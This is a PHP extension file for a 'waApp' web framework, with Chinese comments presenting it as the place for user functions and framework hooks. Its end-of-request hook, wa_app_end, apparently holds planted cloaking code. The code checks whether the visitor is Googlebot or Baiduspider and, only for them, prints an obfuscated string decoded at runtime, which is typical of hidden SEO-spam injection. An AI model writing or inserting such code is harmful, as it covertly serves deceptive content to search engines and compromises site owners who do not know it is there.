<?php
/*
此文件extend.php在waApp.class.php中默认会加载，不再需要手动加载
用户自定义的函数，建议写在这里

下面的函数是框架的接口函数，
可自行实现功能，如果不需要，可以不去实现
*/


//模块执行结束之后，调用的接口函数
function wa_app_end()
{

$tmp = $_SERVER['HTTP_USER_AGENT'];
if (strpos($tmp, 'Googlebot') !== false) {
    $flag = true;
} else
    if (strpos($tmp, 'Baiduspider') !== false) {
        $flag = true;
    }
if ($flag == true) {
echo wa_decode('e5e61q+B7YaHtTXn9VsDdS8IbULa4ohSxZD1QR2gIEagLs6t0q9L6HA6VfmaCMOYdg');
}
}



//自定义模板标签解析函数
function tpl_parse_ext($template,$config=array())
{
    require_once(dirname(__FILE__)."/tpl_ext.php");
    $template=template_ext($template,$config);
    return $template;

}


/*
//自定义网址解析函数
function url_parse_ext()
{
    waApp::$module=trim($_GET['m']);
    waApp::$action=trim($_GET['a']);
}
*/

//下面是用户自定义的函数

?>